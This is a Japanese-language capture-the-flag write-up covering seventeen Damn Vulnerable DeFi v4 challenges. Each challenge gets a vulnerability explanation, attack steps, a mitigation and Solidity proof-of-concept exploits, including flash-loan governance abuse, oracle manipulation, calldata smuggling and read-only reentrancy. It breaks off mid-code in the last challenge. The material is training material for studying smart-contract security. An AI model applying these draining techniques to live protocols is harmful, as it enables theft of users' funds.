# Damn Vulnerable DeFi v4 攻略メモ
by tinamints

## 1. Unstoppable
無料のフラッシュローンを提供するERC4626のvault。残高に対する厳格な不変条件（常に成り立つべき条件）のせいでDoS攻撃を受ける。
### 目標 :
- vault を停止させる
### 脆弱性 :
- `flashLoan`は`convertToShares(totalSupply) == balanceBefore`を要求する。これはvaultのトークン残高が`deposit`（sharesをmintする）経由でしか増えないという前提に立っている。直接`transfer`されると、sharesがmintされないまま残高だけが増えるためチェックが通らなくなり、以後すべての`flashLoan`がrevertする
### 攻撃手順 :
- `token.transfer`で1 wei（DVTの最小単位）をvaultへ直接送り、チェックを永久に壊す
### 対策 :
- `token.balanceOf`に厳格な不変条件を結びつけない。ERC4626の会計はshares/assetsを内部で管理し、直接の`transfer`で`flashLoan`が壊れないようにする。また`convertToShares(totalSupply) != balanceBefore`のチェックは削除する
### POC
```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver
固定手数料1 WETHでメタトランザクションに対応したWETHフラッシュローンプール。他人名義でのローン実行と送信者の偽装が可能。
### 目標 :
- receiver（10 WETH）とプール（1000 WETH）の全WETHをrecovery へ移す
- 2トランザクション以内で完了する
### 脆弱性 :
- 誰でも任意の`receiver`を指定して`flashLoan`を呼べ、receiverはローンを開始した人を確認しない。そのためreceiverに1 WETHの手数料を何度も払わせることができ、手数料はすべてプールの`feeReceiver`（deployer）に入る
- `withdraw`は`_msgSender()`を使い、trusted forwarder経由の呼び出しではcalldataの末尾20バイトを信用する。forwarder + `multicall`経由で任意のアドレスを末尾に付ければ、deployerとして引き出せる
### 攻撃手順 :
- 金額0の`flashLoan`をreceiver宛てに10回、1つの`multicall`にまとめて実行し、receiverの10 WETHを手数料としてdeployerの預金へ移す
- deployerとしてプールの全残高（1000 + 10 WETH）を引き出し、recoveryへ送る（POCは近道として`vm.prank(deployer)`を使っている。本来はforwarder経由のリクエストで、`withdraw`のcalldata末尾にdeployerのアドレスを付ける）
### 対策 :
- flash loanを実際に開始した人を認証する（receiverが自分で頼んでいないローンの手数料を負担させられないようにする）。また`withdraw`ではforwarder経由の`_msgSender()`を信用せず、適切なアクセス制御と信頼できるforwarderの検証を行う
### POC
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory data = new bytes[](10);
    for (uint256 i = 0; i < 10; i++) {
        data[i] = abi.encodeWithSignature(
            "flashLoan(address,address,uint256,bytes)",
            address(receiver),
            address(weth),
            0,
            ""
        );
    }
    pool.multicall(data);

    vm.startPrank(address(deployer));
    pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
    vm.stopPrank();
}
```

## 3. Truster
借り手の代わりに任意の呼び出しを行うDVTフラッシュローンプール。未検証の外部呼び出しの脆弱性がある。
### 目標 :
- プールの全DVT（100万枚）をrecoveryへ移す
- 1トランザクションで完了する
### 脆弱性 :
- `flashLoan(amount, borrower, target, data)`はプールを`msg.sender`として`target.functionCall(data)`を実行し、借入額は0でもよい。つまり誰でもプールに任意のコントラクトの任意の関数を呼ばせられる
### 攻撃手順 :
- `target = token`、`data = approve(attacker, 全トークン)`で0 DVTを借り、プール自身に攻撃者をapproveさせる。その後`transferFrom`で全額をrecoveryへ送る。両方を1つの攻撃コントラクト内で行うので1トランザクションになる
### 対策 :
- poolが自身の権限で任意の`target.call(data)`を実行できないようにする。ユーザー指定の呼び出しを廃止するか、target/selectorをホワイトリスト化して、tokenの`approve`を呼べないようにする
### POC
```solidity
function test_truster() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
    attacker.attack();
}
```

## 4. Side Entrance
預け入れ・引き出し・無料フラッシュローンができるETHプール。預け入れでローンを返済できてしまう脆弱性がある。
### 目標 :
- プールの全ETH（1000 ETH）をrecoveryへ移す
### 脆弱性 :
- `flashLoan`はプールのETH残高が元に戻ったかだけを確認し、*どうやって*戻ったかは気にしない。そのため借りたETHを`deposit`すると返済扱いになり、しかも攻撃者の`balances`も増える
### 攻撃手順 :
- 1000 ETHをすべてフラッシュローンで借り、`execute`内でそれを`deposit`する。ローンのチェックは通り、攻撃者の残高は1000 ETHになる。`withdraw`してETHをrecoveryへ送る
### 対策 :
- ローン中の`deposit`を返済扱いにしない：`flashLoan`と`deposit`で共有するreentrancy guardを入れるか、返済の確認をユーザーの預金と分けて管理する
### POC
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
    exploit.exploit();
}
```

## 5. The Rewarder
DVTとWETHをマークルプルーフで配布するディストリビューター。同じ報酬を何度も請求できる脆弱性がある。
### 目標 :
- ディストリビューターからできる限り多くの資金をrecoveryへ移す（残るのは端数のみ）
- プレイヤーはbeneficiariesに登録されているので請求できる
### 脆弱性 :
- `claimRewards`は請求のリストを受け取るが、「請求済み」ビットのチェックと設定はトークンが切り替わる時か最後の請求の時にしか行わない。1回の呼び出し内での同一トークン・同一バッチの重複請求は互いにチェックされない
### 攻撃手順 :
- プレイヤーの正当なDVT請求（マークルプルーフ付き）をDVTが空になるまで繰り返した配列を作り、WETHも同様にする。`claimRewards`を1回呼び、すべてをrecoveryへ送る
### 対策 :
- claimを処理する前（またはループ内）で使用済みフラグ（claimed bit）を立て、同一(token, batch)の重複claimを拒否する。これで1回の呼び出しで同じ報酬を何度もclaimできなくなる
### POC
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));

    string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
    Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint256 playerDvtAmount;
    bytes32[] memory playerDvtProof;
    uint256 playerWethAmount;
    bytes32[] memory playerWethProof;

    for (uint i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            playerDvtAmount = dvtRewards[i].amount;
            playerWethAmount = wethRewards[i].amount;
            playerDvtProof = merkle.getProof(dvtLeaves, i);
            playerWethProof = merkle.getProof(wethLeaves, i);
            break;
        }
    }
    require(playerDvtAmount > 0, "Player not found in DVT distribution");
    require(playerWethAmount > 0, "Player not found in WETH distribution");

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount) +
        (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
    uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
    Claim[] memory claims = new Claim[](totalClaimsNeeded);

    for (uint256 i = 0; i < totalClaimsNeeded; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
            tokenIndex: i < dvtClaims ? 0 : 1,
            proof: i < dvtClaims ? playerDvtProof : playerWethProof
        });
    }

    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

## 6. Selfie
トークン投票のガバナンスで管理されるDVTフラッシュローンプール。フラッシュローンで借りた投票権を使える脆弱性がある。
### 目標 :
- プールの全DVT（150万枚）をrecoveryへ移す
### 脆弱性 :
- ガバナンスは*その時点で*投票権の過半数を持っていれば誰でもアクションをキューに登録できる。プールには全資金を任意の宛先へ送る`emergencyExit`（ガバナンスのみ呼び出し可）がある。投票権はプール自身から借りられる
### 攻撃手順 :
- プールの全トークンをフラッシュローンで借り、自分に投票権をdelegateして`emergencyExit(recovery)`をガバナンスアクションとしてキューに登録する。ローンを返済し、`vm.warp`で2日の遅延を待ってからアクションを実行する
### 対策 :
- 投票権は、proposal作成前に保有していたcheckpoint／時間加重の残高で計算する。これで1ブロック内でflashloanした残高がquorumに届かなくなる
### POC
```solidity
function test_selfie() public checkSolvedByPlayer {
    pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
    vm.warp(block.timestamp + 2 days);
    governance.executeAction(1);
}
```

## 7. Compromised
3つのソースの中央値オラクルで価格を決めるNFTエクスチェンジ。オラクルの秘密鍵が漏洩している。
### 目標 :
- エクスチェンジの全ETH（999 ETH）をrecoveryへ移す
- プレイヤーは最終的にNFTを保有しないこと
- NFT価格は最終的に元のままであること
### 脆弱性 :
- 問題文で漏洩した2つのhex文字列をデコード（hex → base64 → テキスト）すると、3つのオラクルソースのうち2つの秘密鍵になる。価格は3つの中央値なので、2つを支配すれば価格を支配できる
### 攻撃手順 :
- 2つの鍵で価格を0に設定し、1 weiでNFTを1枚購入、価格を元の999 ETHに戻してNFTを999 ETHで売却し、ETHをrecoveryへ送る
### 対策 :
- oracleの秘密鍵を安全に保管し、複数の独立したソースを乖離チェック付きで集約する（例：Chainlink）。数個のソースが漏洩・支配されても価格を決められないようにする
### POC
```solidity
function test_compromised() public checkSolved {
    vm.prank(source1); oracle.postPrice("DVNFT", 0);
    vm.prank(source2); oracle.postPrice("DVNFT", 0);
    vm.startPrank(player);
    uint256 nftId = exchange.buyOne{value: 1 wei}();
    nft.approve(address(exchange), nftId);
    vm.stopPrank();
    vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.startPrank(player);
    exchange.sellOne(nftId);
    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
}
```

## 8. Puppet
小さなUniswap V1プールから担保価格を取るDVTレンディングプール。スポット価格オラクルの操作に弱い。
### 目標 :
- レンディングプールの全DVT（10万枚）をrecoveryへ移す
- 1トランザクションで完了する
### 脆弱性 :
- プールは借りるDVTの2倍の価値のETH担保を要求し、その価格にUniswap V1のスポット価格（ペアのETH残高 / DVT残高）を使う。ペアには10 ETH / 10 DVTしかないため、1回の大きなスワップで価格が大きく動く
### 攻撃手順 :
- 1つの攻撃コントラクト内で：EIP-2612の`permit`署名（署名によるapprove。別途`approve`のtxが不要）でプレイヤーの1000 DVTを引き取り、Uniswap V1に売ってDVT価格を暴落させ、わずかになった担保で10万DVTを全額借りてrecoveryへ送る
### 対策 :
- 価格はUniswap V1の即時spot reservesではなく、操作されにくいoracle（TWAP / Chainlink）から取得する
### POC
```solidity
function test_puppet() public checkSolvedByPlayer {
    PuppetPoolAttacker attacker = new PuppetPoolAttacker(
        address(token), address(lendingPool), address(uniswapV1Exchange), recovery
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
    attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
}
```

## 9. Puppet V2
Uniswap V2のリザーブからWETH担保の価格を取るDVTレンディングプール。スポット価格オラクルの操作に弱い。
### 目標 :
- レンディングプールの全DVT（100万枚）をrecoveryへ移す
### 脆弱性 :
- プールは借りるDVTの3倍の価値のWETH担保を要求し、その価格にUniswap V2の`getReserves`によるスポット価格を使う。ペアは小さい（100 DVT / 10 WETH）ので、プレイヤーの1万DVTを売ると価格が暴落する
### 攻撃手順 :
- Uniswap V2で1万DVTをすべてETHに売り、ETHをWETHにwrapし、少なくなった担保をapproveして100万DVTを借り、recoveryへ送る
### 対策 :
- Puppetと同じ：担保の評価にはUniswap V2の`getReserves`のspot価格ではなく、TWAPや外部oracleを使う
### POC
```solidity
function test_puppetV2() public checkSolvedByPlayer {
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
    uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
    weth.deposit{value: ethBalance}();
    weth.approve(address(lendingPool), requiredWETH);
    lendingPool.borrow(poolTokens);
    token.transfer(recovery, token.balanceOf(player));
}
```

## 10. Free Rider
6枚のNFTを1枚15 ETHで売るNFTマーケットプレイス。`buyMany`の支払いロジックが壊れている。
### 目標 :
- マーケットプレイスの全NFT（6点）を奪取し、recovery managerへ渡す
- プレイヤーがバウンティ（45 ETH）を獲得する
### 脆弱性 :
- `buyMany`は`msg.value >= price`をNFTごとに個別にチェックするので、15 ETHを1回払うだけで6枚すべてのチェックを通る
- さらにNFTを買い手へ転送した*後*に「所有者」へ支払うため、売り手への代金が買い手に送られてしまう
### 攻撃手順 :
- Uniswap V2から15 WETHをフラッシュスワップで借りてunwrapし、15 ETHで6枚すべてを購入（代金として90 ETHが戻ってくる）。NFTをrecovery managerへ送って45 ETHのバウンティを受け取り、フラッシュスワップを手数料込みで返済する
### 対策 :
- 各NFTの価格の合計を請求し（アイテムごとに支払いを検証）、代金は売り手（転送前の所有者）に送る。checks-effects-interactionsの順序に従う
### POC
```solidity
function test_freeRider() public checkSolvedByPlayer {
    flashLoanUser attacker = new flashLoanUser(
        address(marketplace), address(recoveryManager), address(nft),
        address(uniswapPair), address(token), address(weth), address(player)
    );
    attacker.flashLoanInitilizer(15 ether);
}
```

## 11. Backdoor
4人のbeneficiaryそれぞれのために作られたSafeウォレットへ10 DVTを支払うレジストリ。ウォレットのsetup中に呼び出しを注入できる。
### 目標 :
- レジストリの全40 DVTをrecoveryへ移す
- 1トランザクションで完了する
### 脆弱性 :
- 誰でも`createProxyWithCallback`でbeneficiary*のために*Safeを作れ、レジストリはその新しいウォレットに支払う。レジストリはownerとthresholdはチェックするが、Safeの`setup()`の任意項目`to`/`data`はチェックしない。これにより新しいウォレットは任意のコントラクトへdelegatecallする
### 攻撃手順 :
- 4ユーザーそれぞれについて、`setup()`で攻撃者のモジュールへdelegatecallし、ウォレットに攻撃者へのDVTの`approve`をさせるSafeを作る。レジストリがウォレットに10 DVTを送ると、攻撃者は即座に`transferFrom`でrecoveryへ送る。すべて攻撃者のconstructor内で実行するので1トランザクションになる
### 対策 :
- registryは任意の`initializer` calldataを信用せず、支払い前に新しいwalletのsetup（想定どおりのowner、module/delegatecall/埋め込み呼び出しが無いこと）を検証する
### POC
```solidity
function test_backdoor() public checkSolvedByPlayer {
    new Attacker(
        address(walletFactory), address(singletonCopy),
        address(walletRegistry), address(token), recovery, users
    );
}
```

## 12. Climber
タイムロックが所有するUUPSアップグレード可能なvault。タイムロックがスケジュール確認より先にアクションを実行してしまう。
### 目標 :
- vaultの全DVT（1000万枚）をrecoveryへ移す
### 脆弱性 :
- `ClimberTimelock.execute()`はすべての呼び出しを先に実行し、その後でoperationがスケジュール済みで実行可能かを確認する。そのためバッチは実行中に*自分自身*をスケジュールできる。さらにタイムロックがvaultの所有者なので、その呼び出しでvaultをアップグレードできる
### 攻撃手順 :
- 1つのバッチを実行する：①遅延を0に設定 ②攻撃コントラクトにproposerロールを付与 ③vaultを悪意のある実装にアップグレード ④攻撃コントラクトを呼び、同じバッチを`schedule`させて最後のチェックを通す。その後アップグレード済みvaultの`sweepFunds`を呼び、全額をrecoveryへ送る
### 対策 :
- operationがscheduleされ実行可能であることを、executeの*前*に確認する（外部呼び出しの前にexecutedとマークする）。schedule→executeの順序を強制する
### POC
```solidity
function test_climber() public checkSolvedByPlayer {
    MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
    ClimberAttack attackContract = new ClimberAttack(
        payable(address(vault)), payable(address(timelock)), recovery, address(token)
    );
    attackContract.attack(address(maliciousImpl));
}
```

## 13. Wallet Mining
認可済みアドレスへSafeをデプロイすると報酬を払うwallet deployer。ストレージスロットの衝突で再初期化できてしまう。
### 目標 :
- ユーザーの入金アドレスにある2000万DVTを全額ユーザーへ回収し、wallet deployerの報酬をwardへ移動
- ユーザーはトランザクションを送ってはいけない。プレイヤーは1回しか送れない
### 脆弱性 :
- `AuthorizerUpgradeable`の`needsInit`はストレージスロット0にあり、プロキシの`upgrader`アドレス（常に非ゼロ）と衝突している。そのため誰でも`init()`を再度呼び出して自分自身を認可できる
- `WalletDeployer.drop()`は選んだ`(wat, nonce)`の組がCREATE2で認可済みアドレスにデプロイされるかしかチェックしないので、正しいnonceをブルートフォースで見つけられる
### 攻撃手順 :
- `init()`を再度呼んで攻撃者を`USER_DEPOSIT_ADDRESS`について認可させ、ファクトリーがそこへデプロイするnonceをブルートフォースで見つけ、`drop()`で本物のSafe（ownerは`user`）をデプロイする。ユーザーの署名で`execTransaction`を使って引き出し、deployerの報酬を`ward`に転送する。すべて攻撃者のconstructor内で行う
### 対策 :
- initフラグは衝突しない専用スロットに保持し（OZの`Initializable`を使う）、`init()`の再実行を防ぐ。また、deploy済みwalletのownerを検証する前に、予測アドレスへ資金を送らない
### POC
```solidity
function test_walletMining() public checkSolvedByPlayer {
    new Attacker(address(token), address(authorizer), address(walletDeployer), user, userPrivateKey, ward);
}

contract Attacker {
    address constant USER_DEPOSIT_ADDRESS = 0xe8BbB8395a7984D06A794aE86e4D723526b55E98;
    IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor(
        address token,
        address authorizer,
        address walletDeployer,
        address user,
        uint256 userPrivateKey,
        address ward
    ) {
        // 1. Get authorized
        getAuthorized(authorizer);

        // 2. Find the nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
        //    and pays 1 DVT to this contract (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Drain the Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. Forward the reward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n)), initCodeHash
            )))));
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
}
```

## 14. Puppet V3
Uniswap V3の10分間TWAPでWETH担保の価格を取るDVTレンディングプール。流動性の低いプールでのTWAP操作に弱い。
### 目標 :
- レンディングプールから100万DVTを全額recoveryへ移す
- セットアップ後115秒未満で完了する
### 脆弱性 :
- プールはわずか10分間のTWAP（時間加重平均価格：一定期間の平均価格）を使い、しかもUniswap V3プールの流動性が小さい（100 DVT / 100 WETH）。十分大きなスワップを約2分維持するだけで平均が大きく下がる
### 攻撃手順 :
- プレイヤーの110 DVTを`exactInputSingle`でUniswap V3プールに売って価格を暴落させ、`vm.warp`で114秒（制限ギリギリ）進めてTWAPを暴落後の価格に近づける。`calculateDepositOfWETHRequired`が十分安くなり、プレイヤーのWETHで100万DVTを借りてrecoveryへ送る
### 対策 :
- TWAPのウィンドウを長くする（および/または2つ目のoracleを使う）。これで1ブロックの短時間の価格操作では平均が十分に動かず、担保の見積もりを欺けなくなる
### POC
```solidity
function test_puppetV3() public checkSolvedByPlayer {
    address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    token.approve(address(uniswapRouterAddress), type(uint256).max);
    uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    console.log("quote1: ", quote1);

    ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,
            address(player),
            block.timestamp,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
        )
    );
    vm.warp(block.timestamp + 114);
    uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.approve(address(lendingPool), quote);
    console.log("quote: ", quote);
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

## 15. ABI Smuggling
呼び出し元ごとに`execute`経由で許可された関数selectorしか実行できない権限付きvault。calldataの密輸に弱い。
### 目標 :
- vaultから100万DVTを全額recoveryへ移す
### 脆弱性 :
- `execute()`はcalldataの固定位置（100バイト目）から読み取ったselectorで権限チェックを行い、`actionData`のoffsetが実際に指す位置は見ていない。そのためチェックされるselectorと実行される呼び出しを別物にできる
### 攻撃手順 :
- calldataを手作業で組み立てる：プレイヤーが呼び出し許可を持つ`withdraw`のselectorを100バイト目にダミーとして置き、`actionData`のoffsetはさらに先の`sweepFunds(recovery, token)`呼び出し（プレイヤーに権限なし）を指すようにする。チェックはダミーで通過するが、vaultは`sweepFunds`を実行する
### 対策 :
- `actionData`を実際に実行されるとおりにデコードし、その本物のpayloadのselectorをチェックする。権限チェック用のselectorをcalldataの固定オフセットから読まない
### POC
```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(address(vault), address(token), recovery);
    bytes memory payload = exploit.executeExploit();
    address(vault).call(payload);
}

contract Exploit {
    function executeExploit() external returns (bytes memory) {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        return calldataPayload;
    }
}
```

## 16. Shards
NFTの「shards」（分割持分）をDVTで売るマーケットプレイス。支払いと返金で丸め方が食い違っている。
### 目標 :
- marketplaceからDVT（0.01%超）を抜き取り、全額recoveryへ送る
- stakingコントラクトの残高は変えてはいけない
- 1トランザクションで完了する
### 脆弱性 :
- `fill()`の支払額は`want * _toDVT(price, rate) / totalShards`で切り捨て計算されるため、100 shardsを買うと0 DVTになる（100 * 75e21 / 1e25 = 0.75 → 0）
- `cancel()`は別の計算式`shards * rate / 1e6`（切り上げ）で返金するため、同じ100 shardsで約7.5e12 wei のDVTが返ってくる
- `cancel()`の時間チェックが逆に書かれているため、購入と同じブロックで即キャンセルできる
### 攻撃手順 :
- 1トランザクションに収めるため、exploitコントラクト内で100 shardsのfill → cancelを10001回繰り返し、利益をrecoveryへ送る
### 対策 :
- 常にプロトコルに有利な一貫した丸め方を使う（請求は切り上げ、返金は切り捨て）。コスト0のfillは拒否し、`cancel()`の逆になっている時間チェックの比較を修正する
### POC
```solidity
function test_shards() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(marketplace, token, recovery);
    exploit.attack(1);
}

contract Exploit {
    function attack(uint64 offerId) external {
        uint256 wantShards = 100;
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1, i);
        }
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```

## 17. Curvy Puppet
DVTを担保にCurve stETH/ETHのLPトークンを借りられるlendingコントラクト。Curveの`get_virtual_price()`に対するread-only reentrancyに弱い。
### 目標 :
- lendingコントラクト内の3ユーザー（alice/bob/charlie）のポジションをすべて閉じる（collateralもborrowも0にする）
- treasuryはWETHとLPをいくらか残し、かつ3ユーザー分のDVT（7500）を最終的に持つこと
- playerは最終的に何も残してはいけない
### 脆弱性 :
- lendingコントラクトは借入資産（Curve stETH/ETHのLPトークン）を`ETH_price * get_virtual_price()`で評価する。旧Curveプールの`remove_liquidity`はまずLP供給量をburnし、その後プール残高が確定する**前に**呼び出し元へrawコールでETHを送り返すため、そのETHコールバック中に`get_virtual_price()`が過大な値を読み取る（read-only reentrancy：コントラクトの状態が更新途中のときに*view*関数へ再入すること）
- LPトークンはユーザーの*借入*資産なので、膨らんだLP価格が全員の負債価値を膨らませ、本来は過剰担保だった3つのポジションが清算可能になる
- 清算は`collateralValue*100 < borrowValue*175`で発動する。collateral = 2500 DVT（$10）、borrow = 1 LP なので、`virtual_price > 3.5714e18`まで押し上げる必要がある（通常は約1.1e18）（`CurvyPuppetLending.sol`内）
### 攻撃手順 :
- Balancer（外側・手数料0）とAave（内側）からWETH+wstETHをフラッシュローン → unwrap/withdrawでETH+stETHに変換 → 意図的にstETHを多めにした巨大な`add_liquidity`（spikeはstETH側に比例）→ `remove_liquidity` → ETHを受け取る`receive()`内ではvirtual_priceが跳ね上がっているので、3ユーザーを`liquidate()`する（treasuryの6.5 LPから1人あたり1 LPを支払い、1人あたり2500 DVTを受け取る）
- 返済：ETHが少ない預け入れだったため戻りはETH過多 / stETH不足になり、ほぼ同価値のETH余剰とwstETH不足が生じる。まず返すべきWETHを確保し、残りのETHをLido経由でstETHに変換（treasuryがWETHを残せるよう少額のreserveを残す）してwrapし、必要なwstETHをすべて賄う。主なコストはAaveの約0.05%手数料で、treasuryの200 WETHのクッションで吸収されるため、wstETHの借入は控えめにする
### 対策 :
- 信頼できない呼び出し元へ制御が渡り得る状態で`get_virtual_price()`（やpoolのstate）を読まない。操作されにくいoracleを使うか、viewにもpoolのreentrancy lockをかける（Curveは後に`remove_liquidity`へreentrancy保護を追加した）。また、貸付資産を単一時点のspot virtual priceだけで評価しない
### POC
```solidity
function test_curvyPuppet() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(
        lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
    );
    weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
    IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
    exploit.run();
}

contract Exploit {
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // stETH多め: virtual_priceを ~3.5714e18（清算しきい値）の少し上まで押し上げる
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    uint256 constant ETH_RESERVE = 20e18; // treasuryがWETH > 0で終わるよう残すETH

    // ... immutables + lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users を保存するconstructor
    enum State { NONE, LIQUIDATING }
    State state;

    function run() external {
        // OUTER loan: Balancer（tokenは昇順: wstETH < WETH）
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH); tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // すべてtreasuryへ返す
        weth.deposit{value: address(this).balance}();
        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(balancer), "not balancer");
        // INNER loan: Aave（両資産）, modes [0,0] = 全額返済
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);
        assets[0] = address(weth);  assets[1] = address(wstETH);
